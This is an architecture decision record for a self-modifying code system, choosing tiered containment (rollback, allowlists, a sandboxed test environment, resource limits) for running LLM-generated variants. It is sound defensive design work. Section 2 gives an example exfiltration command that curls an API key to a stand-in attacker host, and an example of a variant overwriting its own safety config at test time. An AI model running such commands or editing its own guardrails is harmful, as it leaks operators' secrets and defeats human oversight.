# ADR 0001 — Isolation strategy for self-modification: rollback vs sandbox

**Status:** Accepted (research-stage)
**Date:** 2026-06-05
**Deciders:** Project lead
**Depends on:** [`threat_model.md`](./threat_model.md) (Plans.md 2.1)
**Drives:** Plans.md 2.4 (adversarial tests validate the chosen boundary), and the
follow-on tasks enumerated in Section 6.

---

## 1. Context

EVOSEAL applies generated code variants back to its own codebase and executes them.
The threat model (2.1) separated two distinct safety concerns:

- **Correctness containment** — a *well-intentioned but wrong* edit must not degrade or
  corrupt the system. **Already handled** by the Git/checkpoint rollback layer, which the
  threat model rated PROTECTED (rollback target validation, checkpoint integrity, Git
  history preservation).
- **Execution containment** — a *malformed or runaway* generated artifact must not damage
  the host, exfiltrate secrets, or consume unbounded resources. **Largely open**; the
  threat model rated the relevant surfaces UNPROTECTED (no edit-scope allowlist, test
  subprocess inherits full env/network/secrets, no resource limits) and PARTIAL (no hard
  iteration cap, per-test timeout only).

The decision before us is framed in Plans.md as "sandbox isolation vs Git rollback." The
first finding of this ADR is that **this framing is a false dichotomy**: rollback and
sandboxing solve *different* problems (recovery vs containment). The real decision is
**how much execution containment a research-stage, single-operator, trusted-model-provider
system needs, and at what cost.**

---

## 2. Decision drivers

1. **Trust model (current).** Single operator, single host, *trusted* model provider. The
   threat model explicitly puts "deliberately hostile LLM crafting an exploit" and
   "multi-tenant isolation" OUT OF SCOPE. Generation is assumed honest-but-fallible.
2. **Cost sensitivity.** EVOSEAL already runs inside a Docker container in production
   (`docker-compose.evoseal.yml`). Per-variant container isolation would mean
   docker-in-docker or a container-spawning orchestration layer — high overhead
   (hundreds of ms + image/mount management per variant) and high complexity.
3. **Cheap mitigations exist — but they live in two different time windows.** Several
   UNPROTECTED items can be closed at low cost without a full container. **Critically, two
   distinct windows must both be guarded** (this is the failure mode an earlier draft of
   this ADR missed):
   - **Edit-application time (T1):** when a generated edit is written to the source tree. A
     path allowlist checked here blocks an edit whose *target* is forbidden
     (`configs/safety.yaml`, CI, `.env`).
   - **Test-execution time (T2):** when the variant's tests run as a subprocess. The test
     code itself runs with full filesystem/network access and can write to a forbidden path
     or exfiltrate secrets *regardless of the T1 allowlist*. A variant that passes the T1
     allowlist can still, inside its test body, do `open("configs/safety.yaml","w")…` or
     `curl attacker.com -d "$ANTHROPIC_API_KEY"`.

   The allowlist alone is therefore **necessary but not sufficient**. T2 requires a different
   class of guard: a scrubbed/network-restricted test environment, read-only mounts of
   critical files, an unprivileged execution user, and resource limits. Both windows are in
   scope for Tier 1; conflating them (guarding only T1) would be security theater.
4. **Honesty over theater.** The project is research-stage and positions itself as such.
   Adopting heavyweight isolation we don't operationally need would be security theater;
   leaving cheap, real gaps open would be negligent. The right answer closes the cheap real
   gaps and defers the expensive ones behind an explicit trigger.

---

## 3. Options considered

### Option A — Full container/VM isolation now

Execute every generated variant (and its tests) inside a fresh, network-disabled,
resource-capped container with no access to host secrets; extract only the result.

- **Pros:** True execution containment. Closes every UNPROTECTED item at once (network
  egress, arbitrary writes, secret exposure, unbounded CPU/memory).
- **Cons:** High runtime cost (per-variant container spawn) and high complexity
  (docker-in-docker from an already-containerized loop, mount/result plumbing, image
  lifecycle). Operationally requires a container runtime on every host. **Over-built for a
  trusted-provider, single-operator research system** — it defends primarily against an
  adversarial-generation threat that the threat model declares out of scope.

### Option B — Keep Git/checkpoint rollback only; change nothing

- **Pros:** Zero cost; already works for correctness containment.
- **Cons:** Leaves real, cheap-to-close gaps open. A buggy variant can still rewrite
  `configs/safety.yaml` (its own guardrails), read `.env` secrets, or call the network.
  **Indefensible when the fixes are nearly free.**

### Option C — Tiered: rollback for recovery + cheap in-process guards now + container as a trigger-gated future tier (CHOSEN)

Keep rollback as the recovery mechanism. Add the cheap in-process containment guards now.
Document full container isolation as a *future tier* adopted only when a named trigger
fires.

- **Pros:** Matches the threat model's actual risk profile. Closes the cheap real gaps,
  avoids the expensive unneeded ones, and states explicitly *when* the expensive tier
  becomes mandatory. Defensible and honest.
- **Cons:** Containment is "defense in depth lite," not airtight — a determined adversarial
  variant could still find a vector. Accepted, because adversarial generation is out of
  scope under the current trust model.

### Lighter alternatives between Tier 1 and Tier 2 (Tier 1.5)

Between in-process guards and a full container sit several **OS-level confinement** options
that were not in the original three-way framing but are worth recording:

- **Run the test subprocess as an unprivileged user** — cheap, no extra runtime; a variant
  can't write root-owned files or read root-owned secrets.
- **Read-only bind mount of critical files** (`configs/safety.yaml`, `.env`) during test
  execution — directly closes the T2 "edits its own guardrails" / secret-read vectors.
- **`firejail` / `bubblewrap`** — lightweight process sandboxing (filesystem + network
  namespaces) without docker-in-docker overhead.
- **`seccomp` / AppArmor / SELinux profiles** — syscall/capability confinement of the test
  subprocess.

These are **platform-specific** (Linux-centric) and add setup/operational complexity, so
they are not adopted by default. They are the natural **escalation path if the in-process
Tier 1 guards prove insufficient** but a full container (Tier 2) is still overkill —
particularly the unprivileged-user + read-only-mount pair, which closes the T2 window
cheaply on the Linux/Docker host EVOSEAL already targets.

---

## 4. Decision

**Adopt Option C — a tiered isolation model, with Tier 1 committed via the follow-on
tasks in Section 6 (not yet implemented).**

| Tier | Mechanism | Status | Adopt when |
|------|-----------|--------|-----------|
| **Tier 0 — Recovery** | Git/checkpoint rollback (`rollback_manager.py`, `checkpoint_manager.py`) | **In place; keep** | Always on |
| **Tier 1 — Containment (T1 + T2 windows)** | Edit-scope allowlist (T1) · scrubbed+network-restricted test env, read-only mounts, unprivileged user (T2) · hard iteration cap + stuck-generator circuit · `resource.setrlimit` on the test subprocess | **Committed, NOT yet implemented** (tasks 2.13–2.15) | Always on, once landed |
| **Tier 2 — Hard isolation** | Per-variant container/VM, network-off, no host secrets, resource-capped | **Deferred; documented** | Any trigger in Section 5 fires |

> **Current state (honest):** Only **Tier 0 is implemented today.** None of the Tier 1
> guards exist yet — the threat model's UNPROTECTED (edit-scope, secret exposure, network
> egress) and PARTIAL (iteration cap, resource limits) verdicts **stand as operative
> risks**. Until tasks 2.13–2.15 land, the system's real posture is closer to Option B
> (rollback only) than to full Option C. This ADR fixes the *direction*; it does not by
> itself make the system safer.
>
> **Interim operator guidance** until Tier 1 lands: run EVOSEAL only with a trusted model
> provider on a host you control; do not place high-value secrets in the environment the
> loop inherits; monitor token/compute spend and be ready to interrupt a stuck loop
> manually (no automatic iteration cap exists yet).

**Answer to the DoD's framing — "if Git rollback is sufficient, explain why the threat
model doesn't require isolation":** Git rollback *is* sufficient for **recovery** and is
the right Tier 0. Full container **isolation is not required under the current trust model**
(trusted provider, single operator, single host) because the threat it primarily defends
against — adversarial/untrusted generation and multi-tenant blast radius — is explicitly
out of scope (threat model §7). What the threat model *does* require is the **Tier 1**
cheap in-process guards, which close the real UNPROTECTED gaps (guardrail self-edit, secret
exfiltration, runaway loop) without the cost of a sandbox. Container isolation is therefore
deferred, not rejected — it is the correct response the moment the trust model changes.

---

## 5. Triggers that promote Tier 2 from "deferred" to "mandatory"

Adopt full container isolation (Tier 2) if **any** of the following becomes true:

1. **Untrusted or adversarial generation** — running an unvetted/local model, or any
   scenario where the generator can no longer be assumed honest-but-fallible.
2. **Shared or multi-tenant host** — EVOSEAL runs where other users' data or workloads share
   the machine, so blast radius is no longer self-contained.
3. **Untrusted execution targets** — the loop evolves code that calls external services with
   side effects, or processes untrusted input during evaluation.
4. **Secrets that must survive a hostile variant** — high-value credentials are present that
   a single leaked `.env` read would make catastrophic.

This list is the explicit contract: **as long as none hold, Tier 0 + Tier 1 is the
accepted boundary.**

---

## 6. Consequences and follow-on tasks

Adopting Option C converts the Tier 1 commitments into concrete work. **Tier 1 is not yet
in place** — these are filed as Plans.md tasks (P1, after this ADR) and the boundary is only
closed once they land and pass 2.4:

- **2.13 — Edit-scope allowlist (T1 window).** Enforce an editable-path allowlist *before*
  any generated edit is written to disk; reject edits targeting `configs/safety.yaml`, CI
  workflows, `.env`, and anything outside the declared "mutable surface." Highest-value,
  lowest-cost mitigation — but guards **only the T1 window** (see Section 2.3); it does not
  stop a variant's *test code* from writing forbidden paths at runtime.
- **2.14 — Sandboxed test execution (T2 window).** Run the test subprocess with secrets
  stripped from the environment, network access disabled/restricted, critical files
  (`configs/safety.yaml`, `.env`) mounted read-only, and ideally as an unprivileged user.
  Closes the exfiltration, egress, and "edits its own guardrails at runtime" vectors that
  the allowlist cannot. This is the indispensable complement to 2.13 — without it, the
  allowlist is bypassable at T2.
- **2.15 — Runaway controls.** Enforce a hard evolution-iteration cap and a "stuck
  generator" circuit (N consecutive rejected/failed variants → stop), plus
  `resource.setrlimit` on the test subprocess with concrete limits: CPU time ≤ test-timeout
  + margin (~120s), address-space/memory ≤ 2 GB, open files ≤ 256; a breach terminates the
  subprocess and rejects the variant. Closes the PARTIAL items in threat model §4/§6.

**Validation:** Plans.md 2.4 (adversarial self-modification tests) validates that 2.13–2.15
actually prevent the attacks in the threat model. **This ADR is a direction, not evidence** —
acceptance is contingent on 2.4 passing once the Tier 1 tasks land.

**What this ADR explicitly does NOT do:** build a container sandbox, implement the Tier 1
guards (2.13–2.15), or change the trust model. It fixes the *direction* so that 2.4 and later
safety work build on a decided boundary instead of an open question.
